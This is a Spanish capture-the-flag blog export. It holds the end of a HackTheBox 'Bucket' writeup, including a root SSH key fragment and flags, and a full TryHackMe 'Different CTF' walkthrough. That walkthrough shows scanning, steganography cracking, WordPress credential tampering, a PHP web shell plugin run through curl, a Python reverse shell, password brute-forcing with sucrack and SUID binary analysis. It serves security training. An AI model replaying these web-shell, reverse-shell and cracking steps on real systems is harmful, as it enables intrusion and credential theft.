lt0oT70NTv2gFGWAb6WHLEByEsnYQwk5ynbIblaApQSZEyVEPkf9LmO7AEb08lvAOS0dQ1 xMyLerif0cNjmemwAAAAtyb290QHVidW50dQECAwQFBg== -----END OPENSSH PRIVATE KEY----- pd4ml evaluation copy. visit http://pd4ml.com   Utilizamos firefox para leer y guardar la clave ya que pdftotext no toma la clave privada entera, utilizamos esta ultima para obtener una shell root y nuestra flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  Last login: Tue Feb 9 14:39:03 2021 root@bucket:~# whoami;id;pwd;hostname root uid=0(root) gid=0(root) groups=0(root) /root bucket root@bucket:~# ls backups docker-compose.yml files restore.php restore.sh root.txt snap start.sh sync.sh root@bucket:~# cat root.txt e342e395617f10eadab82946c523be28 root@bucket:~# root@bucket:~# root@bucket:~# cat /home/roy/user.txt 693f688d2bcb2488ab3dafaaafc1380a root@bucket:~#   ","description":"Bucket es una maquina de HackTheBox, encontramos un S3 con mala configuracion de autenticacion donde subimos una shell inversa en PHP. Encontramos DynamoDB localmente con credenciales para realizar movimiento lateral. Para la escalada de privilegios aprovechamos que Pd4Cmd genera PDFs con informacion de DynamoDB, en este ultimo insertamos HTML para obtener la clave privada de SSH de root. ","id":13,"section":"posts","tags":["s3","aws","dynamodb","gobuster","Pd4Cmd"],"title":"Hack The Box - Bucket","uri":"https://sckull.github.io/posts/bucket/"},{"content":"  Different CTF es una maquina de TryHackMe, encontramos dos versiones de WordPres y vemos un reto de Esteganografia donde encontramos credenciales para el servicio FTP el cual nos dio acceso a PhpMyAdmin. En este ultimo modificamos las credenciales de los usuarios de ambas bases de datos de WordPress, además modificamos variables que nos permitio subir una shell inversa. Realizamos movimiento lateral creando un wordlist personalizado y realizamos ataque a contraseñas con sucrack. Para escalar privilegios encontramos una pista que nos permitió obtener las credenciales para root.\nRoom    Titulo Different CTF      Descripción interesting room, you can shoot the sun   Puntos 150   Dificultad Dificil   Maker hakanbey01     NMAP Escaneo de puertos con nmap nos muestra el puerto http (80) y el puerto ftp (21) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  # Nmap 7.91 scan initiated Mon Apr 19 20:35:16 2021 as: nmap -p- --min-rate 10000 -oN allports 10.10.200.139 Warning: 10.10.200.139 giving up on port because retransmission cap hit (10). Nmap scan report for 10.10.200.139 (10.10.200.139) Host is up (0.31s latency). Not shown: 37023 closed ports, 28510 filtered ports PORT STATE SERVICE 21/tcp open ftp 80/tcp open http # Nmap done at Mon Apr 19 20:38:02 2021 -- 1 IP address (1 host up) scanned in 166.18 seconds # Nmap 7.91 scan initiated Mon Apr 19 21:12:24 2021 as: nmap -sC -sV -oN serviceports 10.10.200.139 Nmap scan report for adana.thm (10.10.200.139) Host is up (0.25s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-generator: WordPress 5.6 |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Hello World \u0026amp;#8211; Just another WordPress site Service Info: OS: Unix Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Mon Apr 19 21:13:10 2021 -- 1 IP address (1 host up) scanned in 45.87 seconds   HTTP Vemos un dominio de redireccion en la pagina principal, el cual agregamos a nuestro archivo /etc/hosts.\n1 2 3 4 5  HTTP/1.1 200 OK Date: Tue, 20 Apr 2021 00:55:24 GMT Server: Apache/2.4.29 (Ubuntu) Link: \u0026lt;http://adana.thm/index.php/wp-json/\u0026gt;; rel=\u0026#34;https://api.w.org/\u0026#34; Content-Type: text/html; charset=UTF-8   Al visitar el puerto 80 vemos que esta corriendo wordpress.\nGOBUSTER Utilizamos gobuster para busqueda de directorios y archivos. Vemos directorios que no son comunes: announcements y phpmyadmin.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  ╭─kali@kali ~/thm/differentctf ╰─➤ gohttp http://adana.thm/ /announcements (Status: 301) [Size: 314] [--\u0026gt; http://adana.thm/announcements/] /index.php (Status: 301) [Size: 0] [--\u0026gt; http://adana.thm/] /index.php (Status: 301) [Size: 0] [--\u0026gt; http://adana.thm/] /javascript (Status: 301) [Size: 311] [--\u0026gt; http://adana.thm/javascript/] /license.txt (Status: 200) [Size: 19915] /phpmyadmin (Status: 301) [Size: 311] [--\u0026gt; http://adana.thm/phpmyadmin/] /readme.html (Status: 200) [Size: 7278] /server-status (Status: 403) [Size: 274] /wp-admin (Status: 301) [Size: 309] [--\u0026gt; http://adana.thm/wp-admin/] /wp-blog-header.php (Status: 200) [Size: 0] /wp-includes (Status: 301) [Size: 312] [--\u0026gt; http://adana.thm/wp-includes/] /wp-content (Status: 301) [Size: 311] [--\u0026gt; http://adana.thm/wp-content/] /wp-load.php (Status: 200) [Size: 0] /wp-links-opml.php (Status: 200) [Size: 224] /wp-mail.php (Status: 403) [Size: 2672] /wp-settings.php (Status: 500) [Size: 0] /wp-trackback.php (Status: 200) [Size: 135] /wp-login.php (Status: 200) [Size: 6544] /wp-config.php (Status: 200) [Size: 0] /wp-cron.php (Status: 200) [Size: 0] /wp-signup.php (Status: 302) [Size: 0] [--\u0026gt; http://adana.thm/wp-login.php?action=register] /xmlrpc.php (Status: 405) [Size: 42] /xmlrpc.php (Status: 405) [Size: 42]   WPSCAN Tambien enumeramos plugins, temas y usuarios utilizando wpscan. Encontramos un usuario y la version desactualizada de wordpress.\n1 2 3 4 5 6 7 8 9 10 11 12 13  [+] WordPress version 5.6 identified (Outdated, released on 2020-12-08). | Found By: Rss Generator (Passive Detection) | - http://adana.thm/index.php/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.6\u0026lt;/generator\u0026gt; | - http://adana.thm/index.php/comments/feed/, \u0026lt;generator\u0026gt;https://wordpress.org/?v=5.6\u0026lt;/generator\u0026gt; [+] hakanbey01 | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Wp Json Api (Aggressive Detection) | - http://adana.thm/index.php/wp-json/wp/v2/users/?per_page=100\u0026amp;page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection)   Observamos en /announcements/ dos archivos, un \u0026ldquo;wordlist\u0026rdquo; y una imagen.\nEn /phpmyadmin vemos el panel de logeo de este administrador.\nSTEGANOGRAPHY Utilizamos stegcracker con la imagen y wordlist encontrados, obtenemos credenciales para el servicio ftp.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  ╭─kali@kali ~/thm/differentctf ╰─➤ stegcracker austrailian-bulldog-ant.jpg wordlist.txt [... REDACTED ...] Counting lines in wordlist.. Attacking file \u0026#39;austrailian-bulldog-ant.jpg\u0026#39; with wordlist \u0026#39;wordlist.txt\u0026#39;.. Successfully cracked file with password: 123adanaantinwar Tried 49380 passwords Your file has been written to: austrailian-bulldog-ant.jpg.out 123adanaantinwar ╭─kali@kali ~/thm/differentctf ╰─➤ cat austrailian-bulldog-ant.jpg.out RlRQLUxPR0lOClVTRVI6IGhha2FuZnRwClBBU1M6IDEyM2FkYW5hY3JhY2s= ╭─kali@kali ~/thm/differentctf ╰─➤ cat austrailian-bulldog-ant.jpg.out|base64 -d FTP-LOGIN USER: hakanftp PASS: NOTAPASSWORD   FTP - HAKANFTP Ingresamos por el servicio FTP donde encontramos los archivos de wordpress, obtuvimos los archivos .bash_history y wp-config.php. Intentamos escribir un archivo para ejecucion de comandos pero tal parece que la carpeta no esta realacionada al wordpress del puerto 80.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30  ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxrwxrwx 8 1001 1001 4096 Jan 15 12:26 . drwxrwxrwx 8 1001 1001 4096 Jan 15 12:26 .. -rw------- 1 1001 1001 88 Jan 13 11:06 .bash_history drwx------ 2 1001 1001 4096 Jan 11 10:29 .cache drwx------ 3 1001 1001 4096 Jan 11 10:29 .gnupg -rw-r--r-- 1 1001 1001 554 Jan 10 22:26 .htaccess drwxr-xr-x 2 0 0 4096 Jan 14 16:49 announcements -rw-r--r-- 1 1001 1001 405 Feb 06 2020 index.php -rw-r--r-- 1 1001 1001 19915 Feb 12 2020 license.txt -rw-r--r-- 1 1001 1001 7278 Jun 26 2020 readme.html -rw-r--r-- 1 1001 1001 7101 Jul 28 2020 wp-activate.php drwxr-xr-x 9 1001 1001 4096 Dec 08 22:13 wp-admin -rw-r--r-- 1 1001 1001 351 Feb 06 2020 wp-blog-header.php -rw-r--r-- 1 1001 1001 2328 Oct 08 2020 wp-comments-post.php -rw-r--r-- 1 0 0 3194 Jan 11 09:55 wp-config.php drwxr-xr-x 4 1001 1001 4096 Dec 08 22:13 wp-content -rw-r--r-- 1 1001 1001 3939 Jul 30 2020 wp-cron.php drwxr-xr-x 25 1001 1001 12288 Dec 08 22:13 wp-includes -rw-r--r-- 1 1001 1001 2496 Feb 06 2020 wp-links-opml.php -rw-r--r-- 1 1001 1001 3300 Feb 06 2020 wp-load.php -rw-r--r-- 1 1001 1001 49831 Nov 09 10:53 wp-login.php -rw-r--r-- 1 1001 1001 8509 Apr 14 2020 wp-mail.php -rw-r--r-- 1 1001 1001 20975 Nov 12 14:43 wp-settings.php -rw-r--r-- 1 1001 1001 31337 Sep 30 2020 wp-signup.php -rw-r--r-- 1 1001 1001 4747 Oct 08 2020 wp-trackback.php -rw-r--r-- 1 1001 1001 3236 Jun 08 2020 xmlrpc.php 226 Directory send OK.   Dentro del archivo .bash_history no encontramos mucho, pero por el historial hakanbey podria ser un usuario.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  ╭─kali@kali ~/thm/differentctf ╰─➤ cat .bash_history id su root ls cd .. ls cd /home ls cd hakanbey/ ls ls -la cd .. ls exit ls cd / ls exit   En wp-config.ph encontramos las credenciales para la base de datos phpmyadmin1.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  ╭─kali@kali ~/thm/differentctf ╰─➤ cat wp-config.php|grep -v \u0026#34;*\u0026#34; \u0026lt;?php define( \u0026#39;DB_NAME\u0026#39;, \u0026#39;phpmyadmin1\u0026#39; ); define( \u0026#39;DB_USER\u0026#39;, \u0026#39;phpmyadmin\u0026#39; ); define( \u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;NOTAPASSWORD\u0026#39; ); define( \u0026#39;DB_HOST\u0026#39;, \u0026#39;localhost\u0026#39; ); define( \u0026#39;DB_CHARSET\u0026#39;, \u0026#39;utf8mb4\u0026#39; ); define( \u0026#39;DB_COLLATE\u0026#39;, \u0026#39;\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;@[5K4Q%_gsP%x=QJ]#-lX`BXVNSu7o}5=ht}L~/t%Txt Gx+\u0026lt;BX=,MeiiCHcXvc^\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;,;0^d77wq7mtnGM1o%WaN.MpMJ9Zj69sI^)2cIVdR3h\u0026gt;YP/S:~SrIn+0AY$Adz.K\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;\u0026gt;,V\u0026gt;-2!VKaBkkeRd|K\u0026amp;!([%}!;TfeA`@ikjcC/[]:: $.K\u0026amp;L.-`gk_3%t5/fu_Zd\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;BOk(mP#GI:/ApR/z#w]p\u0026lt;-{smWKoG]qW=gAFR:W=tp_EVb:TN!@cVidma6l@2R$s\u0026#39; ); $table_prefix = \u0026#39;wp_\u0026#39;; define( \u0026#39;WP_DEBUG\u0026#39;, false ); if ( ! defined( \u0026#39;ABSPATH\u0026#39; ) ) { define( \u0026#39;ABSPATH\u0026#39;, __DIR__ . \u0026#39;/\u0026#39; ); } require_once ABSPATH . \u0026#39;wp-settings.php\u0026#39;;   PHPMYADMIN Ingresamos a phpmyadmin con las credenciales encontradas y vemos dentro de las bases de datos phpmyadmin, phpmyadmin1 dos hashes que pertenecen al usuario hackandbey01. Aunque solamente encontramos la contraseña de la base de datos de phpmyadmin1 la cual es la misma al usuario phpmyadmin.\n1 2 3 4 5 6 7 8 9 10 11 12 13  ╭─kali@kali ~/thm/differentctf[4/4] ╰─➤ john --wordlist=wordlist.txt hashes Using default input encoding: UTF-8 Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3]) Cost 1 (iteration count) is 8192 for all loaded hashes Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status NOTAPASSWORD (?) Warning: Only 80 candidates left, minimum 96 needed for performance. 1g 0:00:00:01 DONE (2021-04-19 21:30) 0.7575g/s 37878p/s 38169c/s 38169C/s bobocel..alexis15 Use the \u0026#34;--show --format=phpass\u0026#34; options to display all of the cracked passwords reliably #$P$BEyLE6bPLjgWQ3IHrLu3or19t0faUh.:123455   Intentamos realizar la escritura de una shell utilizando SQL pero al parecer mysql esta limitado a la carga y escritura de archivos, solamente esta permitida la escritura en una carpeta previamente configurada /var/lib/mysql-files/.\nAdemás encontramos un dominio dentro de las opciones del usuario hakankey01 -\u0026gt; asd.thm en ambas bases de datos, tambien dentro de la tabla wp_option vemos un subdominio especificamente en phpmyadmin1.\nCon la informacion anterior podriamos decir que existen dos bases de datos distintas para dos direcciones de Wordpress. Agregamos el subdominio al archivo /etc/hosts, al visitar el subdominio vemos el mismo tema y contenido.\nWP_USER Editamos la contraseña del usuario hackandbey01 en las base de datos con un hash nuevo que generamos en secure-site.\n1  $P$5ZDzPE45Ci.QxPaPz.03z6TYbakcSQ0 --\u0026gt; password   Luego de unos segundos logramos obtener acceso con la nueva contraseña en el panel de ambos wordpress, aunque no logramos subir ningun tipo de archivo o plugin para obtener una shell ya que no tenemos suficientes permisos en el directorio actual.\nFTP \u0026gt; WORDPRESS Anteriormente intentamos subir archivos a FTP pero encontramos que adana.thm no estaba relacionado al directorio de FTP, al subir un archivo a FTP intentamos realizar una solicitud al archivo subido en el subdominio y observamos que este subdominio si está relacionado al directorio de FTP más no tenemos acceso a estos archivos.\n1 2 3 4 5 6 7 8 9  ╭─kali@kali ~/thm/differentctf ╰─➤ cat i.txt hello ╭─kali@kali ~/thm/differentctf ╰─➤ curl -sI http://subdomain.adana.thm/wp-content/plugins/akismet/i.txt HTTP/1.1 403 Forbidden Date: Wed, 21 Apr 2021 04:54:54 GMT Server: Apache/2.4.29 (Ubuntu) Content-Type: text/html; charset=iso-8859-1   Verificamos en el servicio FTP y vemos que los permisos del archivo subido (i.txt) es diferente (600) al que los demás archivos (644).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  ftp\u0026gt; ls -lah 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwxr-xr-x 4 1001 1001 4096 Apr 21 04:54 . drwxr-xr-x 5 1001 1001 4096 Apr 21 04:38 .. -rw-r--r-- 1 1001 1001 629 May 09 2016 .htaccess -rw-r--r-- 1 1001 1001 18092 Aug 24 2015 LICENSE.txt drwxr-xr-x 3 1001 1001 4096 Dec 08 22:13 _inc -rw-r--r-- 1 1001 1001 2543 Oct 22 19:16 akismet.php -rw-r--r-- 1 1001 1001 20307 Oct 13 2020 changelog.txt -rw-r--r-- 1 1001 1001 49941 Oct 19 2020 class.akismet-admin.php -rw-r--r-- 1 1001 1001 4663 Jun 28 2018 class.akismet-cli.php -rw-r--r-- 1 1001 1001 11135 Oct 30 2018 class.akismet-rest-api.php -rw-r--r-- 1 1001 1001 2856 Jul 13 2017 class.akismet-widget.php -rw-r--r-- 1 1001 1001 58662 Oct 19 2020 class.akismet.php -rw------- 1 1001 1001 6 Apr 21 04:54 i.txt -rw-r--r-- 1 1001 1001 26 Mar 10 2014 index.php -rw-r--r-- 1 1001 1001 2386 Dec 04 15:04 readme.txt drwxr-xr-x 2 1001 1001 4096 Dec 08 22:13 views -rw-r--r-- 1 1001 1001 6438 Apr 02 2019 wrapper.php 226 Directory send OK. ftp\u0026gt;   UPLOAD_PATH \u0026gt; WWW-DATA Como se menciono anteriormente Wordpress mostraba error de permisos de escritura, realizamos una busqueda de los errores que wordpress nos mostraba, la mayoria de las \u0026ldquo;soluciones\u0026rdquo; explica que se debe de cambiar los permisos a la carpeta wp-content pero se necesita acceso a la maquina. En el area de soporte de Wordpress encontramos un comentario que indica la opcion upload_path en wp_options y enlaza un video de como cambiar y solucionar este error en la base de datos.\nVerificamos la direccion en la base de datos de phpmyadmin y observamos que está vacia, por lo que agregamos una direccion en este caso /dev/shm.\nIntentamos subir un archivos los cuales se subieron correctamente aunque no se podian visualizar.\nRealizamos lo mismo en el subdominio, extrañamente pasaba lo mismo.\nPLUGIN \u0026gt; SHELL Intentamos subir un plugin para ejecucion de comandos, además utilizamos las credenciales FTP y direccion 127.0.0.1.\nEl plugin se subió correctamente más no apareció en la direccion que debería al intentar ejecutar comandos.\n1 2 3 4 5 6  ╭─kali@kali ~/thm/differentctf/tmp ╰─➤ curl -sI \u0026#34;http://adana.thm/wp-content/plugins/shell/shell.php?cmd=id\u0026#34; HTTP/1.1 404 Not Found Date: Wed, 21 Apr 2021 07:45:43 GMT Server: Apache/2.4.29 (Ubuntu) Content-Type: text/html; charset=iso-8859-1   Intentamos subir el mismo plugin en wordpress del subdominio pero aparecia como ya instalado.\nRealizamos la ejecucion de comandos con el plugin pero utilizando la direccion del subdominio en el cual si logramos la ejecucion.\n1 2 3 4 5 6 7 8 9 10  ╭─kali@kali ~/thm/differentctf/tmp ╰─➤ curl -I \u0026#34;http://subdomain.adana.thm/wp-content/plugins/shell/shell.php?cmd=id\u0026#34; HTTP/1.1 200 OK Date: Wed, 21 Apr 2021 07:51:29 GMT Server: Apache/2.4.29 (Ubuntu) Content-Type: text/html; charset=UTF-8 ╭─kali@kali ~/thm/differentctf/tmp ╰─➤ curl -s \u0026#34;http://subdomain.adana.thm/wp-content/plugins/shell/shell.php?cmd=id\u0026#34; uid=33(www-data) gid=33(www-data) groups=33(www-data)   Ejecutamos una shell inversa con python, logramos obtener acceso con el usuario www-data y leer nuestra flag web.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  ╭─kali@kali ~/thm/differentctf ╰─➤ listen 1338 listening on [any] 1338 ... connect to [10.2.29.162] from adana.thm [10.10.36.103] 59122 /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ python -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; cd ../../ ls index.php plugins themes upgrade cd ../ ls announcements wp-admin wp-cron.php wp-mail.php index.php wp-blog-header.php wp-includes wp-settings.php license.txt wp-comments-post.php wp-links-opml.php wp-signup.php readme.html wp-config.php wp-load.php wp-trackback.php wp-activate.php wp-content wp-login.php xmlrpc.php cd ../ ls html subdomain cd html ls announcements wp-blog-header.php wp-links-opml.php wp-trackback.php index.php wp-comments-post.php wp-load.php wwe3bbfla4g.txt license.txt wp-config.php wp-login.php xmlrpc.php readme.html wp-content wp-mail.php wp-activate.php wp-cron.php wp-settings.php wp-admin wp-includes wp-signup.php cat wwe3bbfla4g.txt cat wwe3bbfla4g.txt THM{THIS_FLAG_IS_FAKE_WEBTXT} www-data@ubuntu:/var/www/html$   Realizamos una enumeracion utilizando grep y ls ya que el comando find solo lo pueden ejecutar hakanbey y root, aunque no encontramos ningun archivo que fuera de ayuda por el momento.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  www-data@ubuntu:/dev/shm$ ls -lahR / 2\u0026gt;/dev/null| awk \u0026#39;/:$/\u0026amp;\u0026amp;f{s=$0;f=0}/:$/\u0026amp;\u0026amp;!f{sub(/:$/,\u0026#34;\u0026#34;);s=$0;f=1;next}NF\u0026amp;\u0026amp;f{ print s\u0026#34;/\u0026#34;$0 }\u0026#39; |grep hakanbey /home/drwxr-x--- 15 hakanbey hakanbey 4.0K Mar 15 12:45 hakanbey /usr/bin/-r-srwx--- 1 root hakanbey 13K Jan 14 18:01 binary /usr/bin/-rwxr-x--- 1 root hakanbey 233K Nov 5 2017 find /var/lib/AccountsService/users/-rw-r--r-- 1 root root 248 Jan 10 20:30 hakanbey /var/lib/lightdm-data/drwxrwx--- 2 hakanbey lightdm 4.0K Jan 10 18:32 hakanbey /var/www/html/-rwxrwxrwx 1 hakanbey hakanbey 38 Jan 14 16:50 wwe3bbfla4g.txt www-data@ubuntu:/dev/shm$ www-data@ubuntu:/dev/shm$ ls -lahR / 2\u0026gt;/dev/null| awk \u0026#39;/:$/\u0026amp;\u0026amp;f{s=$0;f=0}/:$/\u0026amp;\u0026amp;!f{sub(/:$/,\u0026#34;\u0026#34;);s=$0;f=1;next}NF\u0026amp;\u0026amp;f{ print s\u0026#34;/\u0026#34;$0 }\u0026#39; |grep \u0026#34;www-data\u0026#34;|grep -v \u0026#34;/var/www/\u0026#34; |grep -v \u0026#34;/proc\u0026#34; | grep -v \u0026#34;/run\u0026#34; /etc/phpmyadmin/-rw-r----- 1 root www-data 520 Jan 10 23:06 config-db.php /etc/phpmyadmin/-rw-r----- 1 root www-data 8 Jan 10 21:43 htpasswd.setup /var/cache/drwxr-xr-x 2 www-data www-data 4.0K Feb 26 2018 tcpdf /var/cache/apache2/drwxr-xr-x 2 www-data www-data 4.0K Aug 12 2020 mod_cache_disk /var/cache/apache2/mod_cache_disk/drwxr-xr-x 2 www-data www-data 4.0K Aug 12 2020 . /var/cache/tcpdf/drwxr-xr-x 2 www-data www-data 4.0K Feb 26 2018 . /var/lib/phpmyadmin/-rw-r----- 1 root www-data 68 Jan 10 21:43 blowfish_secret.inc.php /var/lib/phpmyadmin/-rw-r----- 1 root www-data 0 Jan 10 21:43 config.inc.php /var/lib/phpmyadmin/drwxr-xr-x 2 www-data www-data 4.0K Nov 18 00:16 tmp /var/lib/phpmyadmin/tmp/drwxr-xr-x 2 www-data www-data 4.0K Nov 18 00:16 . /var/lib/ucf/cache/-rw-r----- 1 root www-data 520 Jan 10 23:06 :etc:phpmyadmin:config-db.php www-data@ubuntu:/dev/shm   HAKANBEY - USER Siguiendo las diferentes pistas como el tag de la room, utilizamos sucrack para intentar obtener la contraseña del usuario hakanbey con la wordlist del directorio \u0026ldquo;oculto\u0026rdquo;, aunque luego de varias horas no logramos encontrar la contraseña en el wordlist.\nObservamos las pistas dadas en el Discord - TryHackMe, creamos un diccionario a partir de el prefijo de las dos contraseñas previamente encontradas en wordlist.txt logramos encontrar la contraseña del usuaro hakanbey.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  # 123adanaantinwar # 123adanacrack # 123adana \u0026lt;\u0026lt;\u0026lt;--- prefix www-data@ubuntu:/dev/shm/tmp$ cat wordlist.txt | while read line; do echo 123adana${line}; done \u0026gt; 123adana.txt www-data@ubuntu:/dev/shm/tmp$ ../sucrack -u hakanbey -b 10 -w 10 123adana.txt 447/803863 4015/803863 9895/803863 12796/803863 16252/803863 18071/803863 21805/803863 24561/803863 26824/803863 31110/803863 34770/803863 password is: NOTAPASSWORD www-data@ubuntu:/dev/shm/tmp$   Realizamos la lectura de la flag user.txt.\n1 2 3 4 5 6 7 8  hakanbey@ubuntu:~$ pwd;id /home/hakanbey uid=1000(hakanbey) gid=1000(hakanbey) groups=1000(hakanbey),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd) hakanbey@ubuntu:~$ ls Desktop Downloads Pictures Templates Videos Documents Music Public user.txt website hakanbey@ubuntu:~$ cat user.txt THM{HELLO_AGAIN_FAKE_FLAG}   PRIVILEGE ESCALATION Hacemos una pequeña enumeracion y encontramos un fichero (binary) con permisos SUID. Utilizamos env para obtener una shell root.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  hakanbey@ubuntu:~$ find / -perm -4000 2\u0026gt;/dev/null|xargs ls -lah -rwsr-xr-x 1 root root 31K Aug 11 2016 /bin/fusermount -rwsr-xr-x 1 root root 43K Sep 16 2020 /bin/mount -rwsr-xr-x 1 root root 63K Jun 28 2019 /bin/ping -rwsr-xr-x 1 root root 44K Mar 22 2019 /bin/su -rwsr-xr-x 1 root root 27K Sep 16 2020 /bin/umount -rwsr-xr-x 1 root root 22K Jun 28 2019 /usr/bin/arping -rwsr-sr-x 1 daemon daemon 51K Feb 20 2018 /usr/bin/at -r-srwx--- 1 root hakanbey 13K Jan 14 18:01 /usr/bin/binary -rwsr-xr-x 1 root root 75K Mar 22 2019 /usr/bin/chfn -rwsr-xr-x 1 root root 44K Mar 22 2019 /usr/bin/chsh -rwsr-xr-x 1 root root 75K Mar 22 2019 /usr/bin/gpasswd -rwsr-xr-x 1 root root 40K Mar 22 2019 /usr/bin/newgrp -rwsr-xr-x 1 root root 59K Mar 22 2019 /usr/bin/passwd -rwsr-xr-x 1 root root 22K Mar 27 2019 /usr/bin/pkexec -rwsr-xr-x 1 root root 146K Jan 31 2020 /usr/bin/sudo -rwsr-xr-x 1 root root 19K Jun 28 2019 /usr/bin/traceroute6.iputils -rwsr-xr-- 1 root messagebus 42K Jun 11 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 10K Mar 28 2017 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 427K Mar 4 2019 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 14K Mar 27 2019 /usr/lib/policykit-1/polkit-agent-helper-1 -rwsr-xr-x 1 root root 621K Mar 15 13:02 /usr/local/bin/sudo -rwsrwxrwx 1 root root 1.1M May 14 2020 /usr/sbin/exim4 -rwsr-xr-- 1 root dip 370K Jul 23 2020 /usr/sbin/pppd hakanbey@ubuntu:~$   STRACE Al ejecutar el fichero pide la string correcta, al ingresar nuestra contraseña nos mata la shell con hakanbey.\n1 2 3 4 5  hakanbey@ubuntu:/$ /usr/bin/binary I think you should enter the correct string here ==\u0026gt;123adanasubaru pkill: killing pid 1791 failed: Operation not permitted pkill: killing pid 1958 failed: Operation not permitted www-data@ubuntu:/$   Utilizamos ltrace para ver un poco el codigo que esta siendo ejecutado, observamos que warzoneinadana es un string que esta siendo concatenado, además es comparada con la string que ingresamos, en el caso de no ser iguales mata nuestra shell.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  hakanbey@ubuntu:/$ ltrace /usr/bin/binary strcat(\u0026#34;war\u0026#34;, \u0026#34;zone\u0026#34;) = \u0026#34;warzone\u0026#34; strcat(\u0026#34;warzone\u0026#34;, \u0026#34;in\u0026#34;) = \u0026#34;warzonein\u0026#34; strcat(\u0026#34;warzonein\u0026#34;, \u0026#34;ada\u0026#34;) = \u0026#34;warzoneinada\u0026#34; strcat(\u0026#34;warzoneinada\u0026#34;, \u0026#34;na\u0026#34;) = \u0026#34;warzoneinadana\u0026#34; printf(\u0026#34;I think you should enter the cor\u0026#34;...) = 52 123adanasubaru 123adanasubaru ) = 1 strcmp(\u0026#34;123adanasubaru\u0026#34;, \u0026#34;warzoneinadana\u0026#34;) = -70 strcat(\u0026#34;pki\u0026#34;, \u0026#34;l\u0026#34;) = \u0026#34;pkil\u0026#34; strcat(\u0026#34;pkil\u0026#34;, \u0026#34;l\u0026#34;) = \u0026#34;pkill\u0026#34; strcat(\u0026#34;pkill\u0026#34;, \u0026#34; -9\u0026#34;) = \u0026#34;pkill -9\u0026#34; strcat(\u0026#34;pkill -9\u0026#34;, \u0026#34; -t\u0026#34;) = \u0026#34;pkill -9 -t\u0026#34; strcat(\u0026#34;pkill -9 -t\u0026#34;, \u0026#34; pts\u0026#34;) = \u0026#34;pkill -9 -t pts\u0026#34; strcat(\u0026#34;pkill -9 -t pts\u0026#34;, \u0026#34;/0\u0026#34;) = \u0026#34;pkill -9 -t pts/0\u0026#34; system(\u0026#34;pkill -9 -t pts/0\u0026#34;pkill: killing pid 1791 failed: Operation not permitted pkill: killing pid 1829 failed: Operation not permitted www-data@ubuntu:/$   Al ingresar la frase correcta nos muestra una pista y que se realizo una copia de un archivo JPG a nuestra carpeta principal.\n1 2 3 4 5 6 7 8  hakanbey@ubuntu:~$ /usr/bin/binary warzoneinadana Hint! : Hexeditor 00000020 ==\u0026gt; ???? ==\u0026gt; /home/hakanbey/Desktop/root.jpg (CyberChef) Copy /root/root.jpg ==\u0026gt; /home/hakanbey/root.jpg hakanbey@ubuntu:~$ ls -lah /home/hakanbey/root.jpg -rw-rw-r-- 1 root hakanbey 45K Apr 24 00:46 /home/hakanbey/root.jpg hakanbey@ubuntu:~$   Realizamos la ejecucion de multiples herramientas de esteganografia a la imagen pero no encontramos algun string o pista dentro de esta.\n1 2 3 4 5 6 7 8 9 10 11 12  ╭─kali@kali ~/Pictures ╰─➤ xxd root.jpg|head 00000000: ffd8 ffe0 0010 4a46 4946 0001 0101 0060 ......JFIF.....` 00000010: 0060 0000 ffe1 0078 4578 6966 0000 4d4d .`.....xExif..MM 00000020: fee9 9d3d 7918 5ffc 826d df1c 69ac c275 ...=y._..m..i..u 00000030: 0000 0056 0301 0005 0000 0001 0000 0068 ...V...........h 00000040: 0303 0001 0000 0001 0000 0000 5110 0001 ............Q... 00000050: 0000 0001 0100 0000 5111 0004 0000 0001 ........Q....... 00000060: 0000 0ec4 5112 0004 0000 0001 0000 0ec4 ....Q........... 00000070: 0000 0000 4164 6f62 6520 496d 6167 6552 ....Adobe ImageR 00000080: 6561 6479 0000 